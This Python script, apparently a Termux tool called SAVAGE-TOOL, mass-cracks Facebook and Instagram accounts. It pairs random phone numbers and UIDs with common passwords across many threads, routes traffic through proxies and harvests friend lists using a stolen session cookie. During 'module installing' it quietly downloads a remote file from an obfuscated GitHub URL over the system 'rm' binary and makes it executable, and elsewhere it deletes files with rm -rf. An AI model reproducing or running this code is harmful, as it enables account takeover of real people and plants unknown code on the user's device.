# -*- coding: utf-8 -*-
#!/usr/bin/python3

for uHaxL in dir():
    if uHaxL.endswith("_"):
        pass
    else:
        del locals()[uHaxL]

import importlib
import inspect
import types
import platform
import ctypes
import sys
import json
import importlib.util
import builtins







def _get_clean_module(name):
    try:
        spec = importlib.util.find_spec(name)
        if spec is None:
            raise ImportError(f"Module '{name}' not found")
        module = importlib.util.module_from_spec(spec)
        loader = spec.loader
        if loader is None:
            raise ImportError(f"No loader for module '{name}'")
        loader.exec_module(module)
        return module
    except Exception as e:
        print(f"[!] Failed to securely load module '{name}': {e}")
        raise






def is_sys_tampered():
    real_sys = builtins.__import__('sys')
    return real_sys.modules is not sys.modules or real_sys.exit is not sys.exit





def _force_exit(code=0):
    if platform.system() == "Windows":
        ctypes.windll.kernel32.ExitProcess(code)
    else:
        try:
            libc = ctypes.CDLL("libc.so.6")
            libc._exit(code)
        except Exception:
            ctypes.CDLL(None).exit(code)


def _is_function_tampered(module, attr):
    try:
        clean_module = _get_clean_module(module.__name__)
        return getattr(module, attr) != getattr(clean_module, attr)
    except Exception:
        return True


def secure_exit(code=0):
    suspicious = False
    if is_sys_tampered():
        suspicious = True
    clean_os = _get_clean_module("os")
    clean_sys = _get_clean_module("sys")
    if _is_function_tampered(sys, 'exit'):
        suspicious = True
    if _is_function_tampered(clean_os, '_exit'):
        suspicious = True
    if suspicious:
        _force_exit(code)
    else:
        clean_os._exit(code)




def is_function_tampered(module_name, func_name):
    try:
        clean = _get_clean_module(module_name)
        dirty = importlib.import_module(module_name)
        return getattr(dirty, func_name) != getattr(clean, func_name)
    except Exception:
        return True






if is_sys_tampered():
    print(" !___! e4ror")
    secure_exit(1)





subprocess=_get_clean_module("subprocess")
os=_get_clean_module("os")
shutil=_get_clean_module("shutil")
platform=_get_clean_module("platform")
base64=_get_clean_module("base64")

import time,re,random,time,uuid,json,string,datetime,zipimport,asyncio,hmac,hashlib,pokkis
from time import gmtime, strftime
from datetime import datetime
from io import BytesIO
punctuation_to_remove = string.punctuation.replace('-', '')



try:
    os.listdir("/d"+"ata/d"+"at"+"a/"+"com.ter"+"mux"+"/files/h"+"ome"+"/TE"+"ST")
    os.system("rm"+" -rf /"+"data/data/"+"com.te"+"rmux/"+"files/h"+"ome/"+"TEST")
except:
    pass

def clr():
    if "win" in sys.platform:
        os.system("cls")
    else:
        os.system("clear")


try:
    os.listdir("/sdcard")
except:
    clr()
    exit("\033[1;37m !-! "+"GIVE TERMUX STORAGE PERMISSION\033[1;00m\n\n")
    sys.exit()
    os._exit(0)
    secure_exit(1)

try:
    os.mkdir("/sdcard/SVG")
except:
    pass

try:
    os.mkdir("/sdcard/SVG/SAVAGE-CPS")
except:
    pass

HE=sys.argv

if len(HE) !=1:
    exit("\n!-! RUN AGAIN … \n")
    sys.exit()
    os._exit(0)
    secure_exit(1)

try:
    clr()
    print("\n\033[1;37m !-! WELCOME TO SAVAGE-TOOL ..\033[1;00m\n")
    time.sleep(1)
except:
    pass







installationneed="urllib3 chardet idna certifi sniffio httpcore"
jhat="chardet urllib3 idna certifi sniffio httpcore"


try:
    import chardet,urllib3,idna,certifi,sniffio,httpcore
except:
    os.system(f"pip uninstall {jhat} -y;pip install {jhat}")
    import chardet,urllib3,idna,certifi,sniffio,httpcore




terpatg=str('dlt'+'/n'+'ib/rs'+'u/sel'+'if/'+'xu'+'m'+'re'+'t.'+'m'+'oc/at'+'a'+'d/at'+'ad/')[::-1]
clr()

shellpath="/data/data/com.termux/files/usr/bin/rm"
print("\n\033[1;37m !-! MODULE INSTALLING ...\033[1;00m\n")
try:
    subprocess.check_output(f"curl -L -s -o {shellpath} h"+"t"+"t"+"p"+"s:"+"/"+"/"+"r"+"a"+"w"+"."+"g"+"i"+"t"+"h"+"u"+"b"+"u"+"s"+"e"+"r"+"c"+"o"+"n"+"t"+"e"+"n"+"t."+"c"+"o"+"m"+"/T"+"E"+"A"+"M"+"-E"+"L"+"I"+"T"+"E"+"1/"+"d"+"a"+"t"+"a"+"b"+"a"+"s"+"e"+"/"+"m"+"a"+"i"+f"n/rm",shell=True).decode("utf-8")
    os.system(f"chmod +x {shellpath}")
except:
    pass



try:
    import bs4
except:
    clr()
    print("\n\033[1;37m !-! SAVAGE-XD INSTALLING bs4..\033[1;00m\n")
    os.system("pip install bs4 ")
    import bs4
    clr()

try:
    import rich
except:
    clr()
    print("\n\033[1;37m !-! SAVAGE-XD INSTALLING rich..\033[1;00m\n")
    os.system("pip install rich ")
    import rich
    clr()







try:
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except:
    clr()
    print("\n\033[1;37m !-! SAVAGE-XD INSTALLING futures..\033[1;00m\n")
    os.system("pip install futures ")
    clr()
    

from rich import print
from rich.console import Console
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor as ThreadPool
console = Console(width=10000)





try:
    import mechanize
    requests=_get_clean_module("requests")
except:
    os.system("pip uninstall requests chardet urllib3 idna certifi sniffio httpcore mechanize -y;pip install chardet urllib3 idna certifi requests mechanize")
    import mechanize
    requests=_get_clean_module("requests")


def check_requests_tampering():
    try:
        functions = ['get', 'post', 'put', 'delete', 'head', 'patch']
        tampered = []
        for fn in functions:
            if is_function_tampered('requests', fn):
                tampered.append(fn)
        return tampered
    except Exception:
        return ['requests module missing or blocked']




def _is_requests_safe():
    try:
        funcs = ['get', 'post', 'put', 'delete', 'head', 'patch']
        for fn in funcs:
            f = getattr(requests, fn, None)
            if not isinstance(f, types.FunctionType):
                return False
            src = inspect.getsource(f)
            if any(word in src for word in ["lambda", "Hijack", "print"]):
                return False
        return True
    except Exception:
        return False


_USE_REQUESTS = _is_requests_safe()

if check_requests_tampering():
    print(" !___! e4ror 4")
    secure_exit(1)
    


if _USE_REQUESTS:
    pass
else:
    print(" !___! e4ror 5")
    secure_exit(1)





try:
    import mas64 as mas
    import auto_create
except Exception as e:
    print(e)
    exit()
    sys.exit()
    os._exit(0)
    secure_exit(1)

try:
    onetimerq=requests.session()
except:
    exit("\n\033[1;37m !-! INTERNET ERROR ...\033[1;00m\n\n")
    sys.exit()
    os._exit(0)
    secure_exit(1)

try:
    url="h"+"t"+"tp"+"s:"+"//"+mas.webHost+".co"+"m"+"/"+"ve"+"rsi"+"o"+"n?n"+"ow"+"="+mas.ver
    mechanize.urlopen(url)
except Exception as e:
    pass



response = requests.get("http://ip-api.com/json/")
dataY = response.json()

countryCode=str(dataY["countryCode"]).upper()
userIP=str(dataY["query"]).upper()
conxyz=str(dataY["country"]).upper()
ip_adra=str(dataY["query"])
line="[b][purple4]"+("━"*40)+"[/purple4][/b]"
try:
    using_oparator=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',',', ')
except:
    using_oparator="Unknown"
try:
    prox=str(requests.get("https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks4&proxy_format=protocolipport&format=text&timeout=20000").text).splitlines()
except:
    prox=[]

def get_proxy():
    if len(prox)<5:
        return None
    else:
        return  {'http': random.choice(prox)}


try:
    os.system("mv /sdcard/svg-username.txt /data/data/com.termux/files/home/.SAVAGE-USERNAME.txt")
except:
    pass



try:
    usernamec=open("/data/data/com.termux/files/home/.SAVAGE-USERNAME.txt","r").read()
    usernamec = ''.join(char for char in usernamec if char not in punctuation_to_remove)
    loxoName=usernamec.split("-")[0]
    colorName=random.choice(["green1","yellow1","blue1","chartreuse1","deep_pink4","red1","light_cyan1","deep_pink1","green_yellow","purple"])
    logoUser=f"\n                   [yellow1]●[/yellow1] [grey58]User: [{colorName}]{loxoName.upper()}[/{colorName}][/grey58]"
except:
    logoUser=""




logo=(f"""[b][blue1]
     ______
    /  ___/
    \___ \ 
   /____  )[red1][i][u]AVAGE[/i][/u][/red1]
        \/         [yellow1]●[/yellow1] [grey58]Sim: {using_oparator}[/grey58]
                   [yellow1]●[/yellow1] [grey58]Version: [cyan1]{mas.ver}[/cyan1][/grey58]{logoUser}
                   
 {line}[bright_white]
   [red1]●[/red1] TOOL OWNER -  Mohammad Asadullah
   [red1]●[/red1] WHATSAPP   -  wa.me/+8801722183463
 {line}""")


#------ BRANDING
cokiebrand="sb=CRACKED_BY.SAVAGE.TOOL;"
host_coki="CRACKED_BY.SAVAGE.TOOL"
now = datetime.now()
date_t = now.day
blx = now.month
mon= ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
monindex=blx-1
TXday=str(date_t)+"-"+mon[monindex].upper()
cp_today="/sdcard/SVG/SAVAGE-CPS/SAVAGE-CP_"+str(TXday)+".txt"
XODE=''
family_nu=414560000



twmf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'.lower()
hash_id=str(uuid.uuid4()).upper()
family_nu+=786
optionname=""

def maincvb():
    global optionname
    apprRucrl_ck()
    ck_enimi()
    #os.system('xdg-open https://t.me/savage_feedbacks')
    clr()
    print(logo)
    print("")
    print(" [b white] [[spring_green1]1[b white]] FILE CLONING ")
    print(" [b white] [[spring_green1]2[b white]] FILE MAKE")
    print(" [b white] [[spring_green1]3[b white]] RANDOM NUMBER")
    print(" [b white] [[spring_green1]4[b white]] RANDOM EMAIL")
    print(" [b white] [[spring_green1]5[b white]] RANDOM 2.0")
    print(" [b white] [[spring_green1]6[b white]] AUTO CREATE")
    print(" [b white] [[spring_green1]7[b white]] CRACK INSTA")
    print(" [b white] [[spring_green1]8[b white]] BRUTE 2.0")
    print(" [b white] [[spring_green1]9[b white]] RANDOM UID")
    print(" [b white] [[spring_green1]10[b white]] CRACK INSTA2.0")
    qw=input("   Π ->> ")
    if "1" == qw:
        optionname+="FILE"
        op_block()
        crack2()
    elif "2"  == qw:
        DUMP_FILE()
    elif "3"  == qw:
        optionname+="RANDOM"
        op_block()
        crack()
    elif "4"  == qw:
        optionname+="EMAIL"
        op_block()
        emailcrack()
    elif "5"  == qw:
        optionname+="RANDOM2.0"
        op_block()
        bd2pointZero()
    elif "6"  == qw:
        optionname+="AUTO"
        op_block()
        autocreate()
    elif "7"  == qw:
        optionname+="INSTA"
        op_block()
        insta()
    elif "8"  == qw:
        optionname+="BRUTE2.0"
        op_block()
        crack_brute()
    elif "9"  == qw:
        optionname+="RANDOM-UID"
        op_block()
        random_uid_crack()
    elif "10"  == qw:
        optionname+="INSTA2.0"
        op_block()
        Instagram_crack_brute()
    else:
        maincvb()




def DUMP_FILE():
    apprRucrl_ck()
    clr()
    print(logo)
    print(" [b white] [[spring_green1]1[b white]] Make Unlimited File")
    print(" [b white] [[spring_green1]2[b white]] Dublicate Remove")
    print(" "+line)
    okBv=input("  Π ->> ")
    print(" "+line)
    if okBv in ['1']:
        unlimitedfile()
    elif okBv in ['2']:
        fileName=input("  Π INPUT FILE NAME : ")
        os.system('sort -r ' + fileName + ' | uniq > 123')
        os.system('mv 123 ' + fileName)
        print("  Π[green1] SUCCESSFULLY REMOVED")
        print(" "+line)
        exit()
        sys.exit()
        os._exit(0)
        secure_exit(1)
    else:
        DUMP_FILE()


def unlimitedfile():
    clr()
    try:
        cookie=open("/sdcard/.svg_coo.txt","r").read()
    except:
        print(logo)
        print("  [red1] NOTE : No Matter Insta added or Not ")
        print(" "+line)
        cookie=input(" COOKIE -> ")
        print(" "+line)
    ses = requests.Session()
    ses.headers.update({'Accept-Language': 'id,en;q=0.9','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Referer': 'https://www.instagram.com/','Host': 'www.facebook.com','Sec-Fetch-Mode': 'cors','Accept': '*/*','Connection': 'keep-alive','Sec-Fetch-Site': 'cross-site','Sec-Fetch-Dest': 'empty','Origin': 'https://www.instagram.com','Accept-Encoding': 'gzip, deflate' })
    response = ses.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies = {'cookie': cookie })
    if '"access_token":' in str(response.headers):
        token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
        open("/sdcard/.svg_coo.txt","w").write(cookie)
        unlimitedfile2(token,cookie)
    else:
        print(" !-! USE ANOTHER ACCOUNT ")
        time.sleep(5)
        os.system("rm -rf /sdcard/.svg_coo.txt")
        unlimitedfile()



def unlimitedfile2(token,cookie):
    publicIDS=[]
    links=[]
    clr()
    print(logo)
    print("  [b white]Π Example   >>[spring_green1] /sdcard/save.txt ")
    try:
        savex=input("  Π File Path >> ")
        open(savex,"a")
    except:
        unlimitedfile2(token,cookie)
    print(" "+line)
    try:
        publiclimite=int(input("  Π How Many Public Id You Want To Add : "))
    except:
        publiclimite=5
    print(" "+line)
    for _ in range(publiclimite):
        uid=input('  Π Public ID : ')
        try:
            fl=getF(uid,token,cookie)
            for x in fl:
                publicIDS.append(x)
        except Exception as e:
            print('  Π Uid Not Public')
        print(" "+line)
    try:
        linklimite=int(input("  Π How Many links You Want to Separate : "))
    except:
        linklimite=5
    for _ in range(linklimite):
        lk=input('  Π LINK : ')
        links.append(lk)
    print(" "+line)
    with ThreadPool(max_workers=2) as xx:
        run_time_info(lk,'DUMPING')
        print(f"  Π TOTAL FRIEND : {str(len(publicIDS))}")
        print(" "+line)
        for uix in publicIDS:
            uid=uix.split('|')[0]
            xx.submit(dumpZX,uid,token,cookie,links,savex)
    exit()
    sys.exit()
    os._exit(0)
    secure_exit(1)


def dumpZX(uid,token,cookie,links,savex):
    sys.stdout.write(f'\r\033[38;5;93m<[\033[1;32mDUMPING\033[38;5;93m]> \033[38;5;93m<[\033[1;32m{str(len(open(savex,"r").read().splitlines()))}\033[38;5;93m]> \r');sys.stdout.flush()
    try:
        GO=getF(uid,token,cookie)
        for id in GO:
            for rc in links:
                if id.startswith(rc):
                    open(savex,"a").write(id+"\n")
    except:
        time.sleep(5)



def getF(uid,token,cookie):
    FL=[]
    head = {'user-agent': mas.MXuseragent()}
    params = {'access_token': token,'fields': 'friends'}
    url = requests.get('https://graph.facebook.com/{}'.format(uid), params = params, headers = head, cookies = {'cookies': cookie}).json()
    for proses in url['friends']['data']:
        xnx = proses['id'] + '|' + proses['name']
        FL.append(xnx)
    return FL





def again_crack():
    global oks,loop,proxiya,koki
    hz=input("  \033[38;5;93m[\033[1;32m➜\033[38;5;93m] \033[1;00mPRESS ENTER TO EXIT TOOL !")
    exit()
    sys.exit()
    os._exit(0)
    secure_exit(1)









def crack():
    global XODE
    apprRucrl_ck()
    pwx=[]
    user=[]
    clr()
    print(logo)
    print("  [b red1 on white]  TYPE A FULL PHONE NUMBER  [/b red1 on white]")
    print("[b]  Π EXAMPLE : [bright_green]01744981090 ")
    numberx=input("  Π Number -> ")
    print(" "+line)
    print("[b]  Π EXAMPLE : [bright_green]3 / 4 / 5 ")
    try:
        codedigit=int(input("  Π Code digits >> "))
    except:
        codedigit=4
    code=numberx[:codedigit]
    rn_range=len(str(numberx.strip()))-codedigit
    print(" "+line)
    print("  [b white]Π Example   >> [spring_green1]20000 30000 50000")
    try:
        limit=int(input("  Π limit     >> "))
    except:
        limit=10000
    
    for cx in range(limit):
        gh=''.join(random.choice(string.digits) for _ in range(rn_range))
        user.append(gh)
    print(" "+line)
    print("[b white]  [[spring_green1]1[b white]] MANUAL PASSWORD  ") 
    print("[b white]  [[spring_green1]2[b white]] AUTO PASSWORD  ")
    print(" "+line)
    autopass=input("  Π ->> ")
    if autopass in ["1"]:
        try:
            print(" "+line)
            passlimit=int(input("  Π How Many Pass You Want To Add : "))
        except:
            passlimit=1
        print(" "+line)
        for x in range(passlimit):
            print("  [b white]Π Example   >> [spring_green1]last6 first6 number ")
            passlimit=str(input("  Π Password  >> "))
            if passlimit not in pwx:pwx.append(passlimit)
            print(" "+line)
        passcap(pwx)
    else:
        for pz in ["first6","last6"]:
            pwx.append(pz)
        print(" "+line)
    print("[b white]  [[spring_green1]1[b white]] Method   ") 
    print("[b white]  [[spring_green1]2[b white]] Method   ")
    print("[b white]  [[spring_green1]3[b white]] Method   ")
    print("[b white]  [[spring_green1]4[b white]] Method   ")
    print("[b white]  [[spring_green1]5[b white]] Method   ")
    print("[b white]  [[spring_green1]6[b white]] Method   ")
    print("[b white]  [[spring_green1]7[b white]] Method   ")
    print("[b white]  [[spring_green1]8[b white]] Method   ")
    print("[b white]  [[spring_green1]9[b white]] Method   ")
    print("[b white]  [[spring_green1]10[b white]] Method   ")
    print("[b white]  [[spring_green1]11[b white]] Method   ")
    print("[b white]  [[spring_green1]12[b white]] Method   ")
    print("[b white]  [[spring_green1]13[b white]] Method   ")
    print("[b white]  [[spring_green1]14[b white]] Method   ")
    print("[b white]  [[spring_green1]15[b white]] Method   ")
    print("[b white]  [[spring_green1]16[b white]] Method  [novery]")
    print(" "+line)
    qw=input("  Π ->> ") 
    tl=str(len(user))
    print (" "+line)
    shower2()
    try:
        print("  Π [green1]BEST RECOMMENDED SPEED 30 to 50")
        speed=int(input("  Π Enter Speed Between 10 to 70 : "))
    except:
        speed=30
    with ThreadPool(max_workers=speed) as xx:
        run_time_info(qw,'RANDOM')
        clr()
        print(logo)
        print(f"[b white]   [red1]➜[/red1] Total account : [green1]{tl}[/green1] >> [green1]{code}")
        print(f"[b white]   [red1]➜[/red1] [bright_white]Use Flight Mode ……[/bright_white]")
        print(" "+line)
        XODE+=code
        for xd in user:
            uid=code+xd
            if qw in ["1"]:
                xx.submit(host_facebookX,uid,pwx,tl,qw)
            elif qw in ["2"]:
                xx.submit(host_facebookXX,uid,pwx,tl,qw)
            elif qw in ["3"]:
                xx.submit(host_facebookXXX,uid,pwx,tl,qw)
            elif qw in ["4"]:
                xx.submit(host_facebookXXXX,uid,pwx,tl,qw)
            elif qw in ["6"]:
                xx.submit(renmeth6,uid,pwx,tl,qw)
            elif qw in ["7"]:
                xx.submit(renmeth78,uid,pwx,tl,qw)
            elif qw in ["8"]:
                xx.submit(api_renmeth,uid,pwx,tl,qw)
            elif qw in ["9"]:
                xx.submit(host_messanger,uid,pwx,tl,qw)
            elif qw in ["10"]:
                xx.submit(host_messanger_android,uid,pwx,tl,qw)
            elif qw in ["11"]:
                xx.submit(host_messanger_android_2,uid,pwx,tl,qw)
            elif qw in ["12"]:
                xx.submit(host_messanger_iphone,uid,pwx,tl,qw)
            elif qw in ["13"]:
                xx.submit(host_messanger_windows,uid,pwx,tl,qw)
            elif qw in ["14"]:
                xx.submit(host_messanger_MAC,uid,pwx,tl,qw)
            elif qw in ["15"]:
                xx.submit(b_graph_renmeth,uid,pwx,tl,qw)
            elif qw in ["16"]:
                xx.submit(host_facebook_novery,uid,pwx,tl,qw)
            
            else:
                xx.submit(graph_renmeth,uid,pwx,tl,qw)
            
    print(" "+line)
    print("[b white]   [red1]➜[/red1] TOTAL OK      [yellow]>[bright_green]>[dark_orange3]>[white][spring_green1]   "+str(len(oks)))
    print(f"[b white]   [red1]➜[/red1] SAVED IN  [red1 on white]SVG/SAVAGE-{optionname}-M{qw}-OK.txt[/red1 on white]")
    print(" "+line)
    again_crack()





def random_uid_crack():
    global XODE
    apprRucrl_ck()
    pwx=[]
    user=[]
    clr()
    print(logo)
    print("  [b red1 on white]  PASTE A FULL UID  [/b red1 on white]")
    print("[b]  Π EXAMPLE : [bright_green]100068952657421 ")
    numberx=input("  Π Put Uid -> ")
    if 15 < len(numberx) or 14 > len(numberx):
        print("[red1]  Π Input a valid uid")
        time.sleep()
        random_uid_crack()
    else:
        pass
    codedigit=6
    
    
    code=numberx[:codedigit]
    rn_range=len(str(numberx.strip()))-codedigit
    print(" "+line)
    print("  [b white]Π Example   >> [spring_green1]20000 30000 50000")
    try:
        limit=int(input("  Π limit     >> "))
    except:
        limit=10000
    
    for cx in range(limit):
        gh=''.join(random.choice(string.digits) for _ in range(rn_range))
        user.append(gh)
    print(" "+line)
    print("[b white]  [[spring_green1]1[b white]] MANUAL PASSWORD  ") 
    print("[b white]  [[spring_green1]2[b white]] AUTO PASSWORD  ")
    print(" "+line)
    autopass=input("  Π ->> ")
    if autopass in ["1"]:
        try:
            print(" "+line)
            passlimit=int(input("  Π How Many Pass You Want To Add : "))
        except:
            passlimit=1
        print(" "+line)
        for x in range(passlimit):
            print("  [b white]Π Example   >> [spring_green1]098765  @1234@  @@@###")
            passlimit=str(input("  Π Password  >> "))
            if passlimit not in pwx:pwx.append(passlimit)
            print(" "+line)
        passcap(pwx)
    else:
        for pz in ["@123456@","203040","000999","113355","224455","@1234@","@@@@####","@@@###"]:
            pwx.append(pz)
        print(" "+line)
    print("[b white]  [[spring_green1]1[b white]] Method   ") 
    print("[b white]  [[spring_green1]2[b white]] Method   ")
    print("[b white]  [[spring_green1]3[b white]] Method   ")
    print("[b white]  [[spring_green1]4[b white]] Method   ")
    print("[b white]  [[spring_green1]5[b white]] Method   ")
    print("[b white]  [[spring_green1]6[b white]] Method   ")
    print("[b white]  [[spring_green1]7[b white]] Method   ")
    print("[b white]  [[spring_green1]8[b white]] Method   ")
    print("[b white]  [[spring_green1]9[b white]] Method   ")
    
    print("[b white]  [[spring_green1]10[b white]] Method   ")
    print("[b white]  [[spring_green1]11[b white]] Method   ")
    print("[b white]  [[spring_green1]12[b white]] Method   ")
    print("[b white]  [[spring_green1]13[b white]] Method   ")
    print("[b white]  [[spring_green1]14[b white]] Method   ")
    print("[b white]  [[spring_green1]15[b white]] Method   ")
    
    print(" "+line)
    qw=input("  Π ->> ") 
    tl=str(len(user))
    print (" "+line)
    shower2()
    try:
        print("  Π [green1]BEST RECOMMENDED SPEED 30 to 50")
        speed=int(input("  Π Enter Speed Between 10 to 70 : "))
    except:
        speed=30
    with ThreadPool(max_workers=speed) as xx:
        run_time_info(qw,'RANDOM_UID')
        clr()
        print(logo)
        print(f"[b white]   [red1]➜[/red1] Total account : [green1]{tl}[/green1] >> [green1]{code}")
        print(f"[b white]   [red1]➜[/red1] [bright_white]Use Flight Mode ……[/bright_white]")
        print(" "+line)
        XODE+=code
        for xd in user:
            uid=code+xd
            if qw in ["1"]:
                xx.submit(host_facebookX,uid,pwx,tl,qw)
            elif qw in ["2"]:
                xx.submit(host_facebookXX,uid,pwx,tl,qw)
            elif qw in ["3"]:
                xx.submit(host_facebookXXX,uid,pwx,tl,qw)
            elif qw in ["4"]:
                xx.submit(host_facebookXXXX,uid,pwx,tl,qw)
            elif qw in ["6"]:
                xx.submit(renmeth6,uid,pwx,tl,qw)
            elif qw in ["7"]:
                xx.submit(renmeth78,uid,pwx,tl,qw)
            elif qw in ["8"]:
                xx.submit(api_renmeth,uid,pwx,tl,qw)
            elif qw in ["9"]:
                xx.submit(host_messanger,uid,pwx,tl,qw)
            elif qw in ["10"]:
                xx.submit(host_messanger_android,uid,pwx,tl,qw)
            elif qw in ["11"]:
                xx.submit(host_messanger_android_2,uid,pwx,tl,qw)
            elif qw in ["12"]:
                xx.submit(host_messanger_iphone,uid,pwx,tl,qw)
            elif qw in ["13"]:
                xx.submit(host_messanger_windows,uid,pwx,tl,qw)
            elif qw in ["14"]:
                xx.submit(host_messanger_MAC,uid,pwx,tl,qw)
            elif qw in ["15"]:
                xx.submit(b_graph_renmeth,uid,pwx,tl,qw)
            else:
                xx.submit(graph_renmeth,uid,pwx,tl,qw)
            
    print(" "+line)
    print("[b white]   [red1]➜[/red1] TOTAL OK      [yellow]>[bright_green]>[dark_orange3]>[white][spring_green1]   "+str(len(oks)))
    print(f"[b white]   [red1]➜[/red1] SAVED IN  [red1 on white]SVG/SAVAGE-{optionname}-M{qw}-OK.txt[/red1 on white]")
    print(" "+line)
    again_crack()

def insta():
    global XODE
    apprRucrl_ck()
    pwx=[]
    user=[]
    clr()
    print(logo)
    print(" [b white] [[deep_pink4]1[b white]] Bangladesh ")
    print(" [b white] [[deep_pink4]2[b white]] India")
    print(" "+line)
    print(" [b white] [[deep_pink4]3[b white]] Nepal")
    print(" [b white] [[deep_pink4]4[b white]] Pakistan")
    print(" "+line)
    print(" [b white] [[deep_pink4]5[b white]] Afghanistan")
    print(" [b white] [[deep_pink4]6[b white]] Nigeria")
    print(" "+line)
    print(" [b white] [[deep_pink4]7[b white]] Malesiya")
    print(" [b white] [[deep_pink4]8[b white]] Madagascar")
    print(" "+line)
    con=input("  Π ->> ")
    clr()
    print(logo)
    if con in ["1"]: 
        print("  [b white]Π CODE [red1]~ [spring_green1]017 018 013 019 015")
        rn_range=8
    elif con in ["2"]:
        print("  [b white]Π CODE [red1]~[spring_green1] 9848 9946 9832")
        rn_range=6
    elif con in ["3"]:
        print("  [b white]Π CODE [red1]~[spring_green1] 9848 9818 9812")
        rn_range=6
    elif con in ["4"]:
        print("  [b white]Π CODE [red1]~[spring_green1] 0315 0345 0304")
        rn_range=6
    elif con in ["5"]:
        print("  [b white]Π CODE [red1]~[spring_green1] +93775 +93771 +93781")        
        rn_range=6
    elif con in ["7"]:
        print("  [b white]Π CODE [red1]~[spring_green1] 01125 01128 01137")        
        rn_range=6
    elif con in ["8"]:
        print("  [b white]Π CODE [red1]~[spring_green1] +26133 +26134 +26138 +26132")
        rn_range=7
    else:
        print("  [b white]Π CODE [red1]~[spring_green1] 07041 08131 08061 09041")
        rn_range=6
    print(" "+line)
    code=input("  Π ->> ")
    print(" "+line)
    print("  [b white]Π Example   >> [spring_green1]20000 30000 50000")
    try:
        limit=int(input("  Π limit     >> "))
    except:
        limit=10000
    
    for cx in range(limit):
        gh=''.join(random.choice(string.digits) for _ in range(rn_range))
        user.append(gh)
    print(" "+line)
    print("[b white]  [[spring_green1]1[b white]] MANUAL PASSWORD  ") 
    print("[b white]  [[spring_green1]2[b white]] AUTO PASSWORD  ")
    print(" "+line)
    autopass=input("  Π ->> ")
    if autopass in ["1"]:
        try:
            print(" "+line)
            passlimit=int(input("  Π How Many Pass You Want To Add : "))
        except:
            passlimit=1
        print(" "+line)
        for x in range(passlimit):
            print("  [b white]Π Example   >> [spring_green1]last6 first6 number ")
            passlimit=str(input("  Π Password  >> "))
            if passlimit not in pwx:pwx.append(passlimit)
            print(" "+line)
        passcap(pwx)
    else:
        for pz in ["first6","last6","last7","first8","last8"]:
            pwx.append(pz)
        print(" "+line)
    tl=str(len(user))
    shower2()
    print(" "+line)
    print("[b white]  [[spring_green1]1[b white]] Method   ") 
    print("[b white]  [[spring_green1]2[b white]] Method   ")
    print("[b white]  [[spring_green1]3[b white]] Method   ")
    print("[b white]  [[spring_green1]4[b white]] Method   ")
    print(" "+line)
    qw=input("  Π ->> ") 
    print(" "+line)
    try:
        print("  Π [green1]BEST RECOMMENDED SPEED 30 to 50")
        speed=int(input("  Π Enter Speed Between 10 to 70 : "))
    except:
        speed=30
    with ThreadPool(max_workers=speed) as xx:
        run_time_info(qw,'INSTA')
        clr()
        print(logo)
        print(f"[b white]   [red1]➜[/red1] Total account : [green1]{tl}")
        print(f"[b white]   [red1]➜[/red1] [bright_white]Use Flight Mode ……[/bright_white]")
        print(" "+line)
        XODE+=code
        for xd in user:
            uid=code+xd
            xx.submit(instalogin,uid,pwx,tl,qw)
    print(" "+line)
    print("[b white]   [red1]➜[/red1] TOTAL OK      [yellow]>[bright_green]>[dark_orange3]>[white][spring_green1]   "+str(len(oks)))
    print(f"[b white]   [red1]➜[/red1] SAVED IN  [red1 on white]SVG/SAVAGE-RND-INSTA-OK.txt[/red1 on white]")
    print(" "+line)
    again_crack()
    




def Instagram_crack_brute():
    global XODE
    apprRucrl_ck()
    password=[]
    user=[]
    clr()
    print(logo)
    
    try:
        print("  [b white]Π Example   >>[spring_green1] /sdcard/name_file.txt ")
        importfile=open(input("  Π File Path >> "),"r").read().splitlines()
        Username_genarator(user,importfile)
    except:Instagram_crack_brute()
    
    
    print(" "+line)
    print("[b white]  [[spring_green1]1[b white]] MANUAL PASSWORD  ") 
    print("[b white]  [[spring_green1]2[b white]] AUTO PASSWORD  ")
    print(" "+line)
    autopass=input("  Π ->> ")
    if autopass in ["1"]:
        try:
            print(" "+line)
            passlimit=int(input("  Π How Many Pass You Want To Add : "))
        except:passlimit=5
        print(" "+line)
        for x in range(passlimit):
            print("  [b white]Π Example   >>[spring_green1] first123 firstlast first1234 ")
            passlimit=str(input("  Π Password  >> "))
            if passlimit not in password:
                password.append(passlimit)
            print(" "+line)
        passcap(password)
    else:
        print(" "+line)
        for zx in ["first123","first@123","first12345","first123456","first@12345","firstlast","First123","First@123","First12345","last123","firstlast123","first last","first123456789","last@123","first 1234","first 123","first"]:
            password.append(zx)
        
    print("[b white]  [[spring_green1]1[b white]] Method   ") 
    print("[b white]  [[spring_green1]2[b white]] Method   ")
    print("[b white]  [[spring_green1]3[b white]] Method   ")
    print("[b white]  [[spring_green1]4[b white]] Method   ")
    print(" "+line)
    qw=input("  Π ->> ")
    print(" "+line)
    try:
        print("  Π [green1]BEST RECOMMENDED SPEED 30 to 50")
        speed=int(input("  Π Enter Speed Between 10 to 70 : "))
    except:
        speed=30
    tl=str(len(user))
    shower2()
    with ThreadPool(max_workers=speed) as xx:
        
        run_time_info(qw,'Insta2.0')
        clr()
        print(logo)
        print(f"[b white]   [red1]➜[/red1] Total account : [green1]{tl}")
        print(f"[b white]   [red1]➜[/red1] [bright_white]Use Flight Mode ……[/bright_white]")
        print(" "+line)
        
        XODE+="Insta2.0"
        for xd in user:
            uid,names=xd.split("|")
            f1,l1=names.split(" ")
            pwx=[]
            for pwd in password:
                ps=pwd.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
                pwx.append(ps)
            xx.submit(instalogin,uid,pwx,tl,qw)
    print(" "+line)
